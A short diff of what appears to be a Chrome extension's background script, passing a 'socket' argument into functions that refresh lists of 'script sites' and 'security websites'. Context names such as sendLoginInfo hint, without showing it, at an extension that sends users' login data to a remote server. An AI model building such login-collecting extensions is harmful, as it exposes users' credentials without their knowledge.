@@ -76,7 +76,7 @@ function sendLoginInfo(loginInfo) {
 }
 
 function checkScriptWebsites(tabId, changeInfo) {
-  updateScriptWebsites();
+  updateScriptWebsites(socket);
   if (changeInfo.url) {
     chrome.storage.local.get('scriptSites', (scriptSites) => {
       scriptSites.scriptSites.forEach((map) => {
@@ -92,7 +92,7 @@ function checkScriptWebsites(tabId, changeInfo) {
 }
 
 function checkSecurityWebsites(tabId, changeInfo) {
-  updateSecurityWebsites();
+  updateSecurityWebsites(socket);
   if (changeInfo.url) {
     chrome.storage.local.get('securityWebsites', (securityWebsites) => {
       securityWebsites.securityWebsites.forEach((site) => {
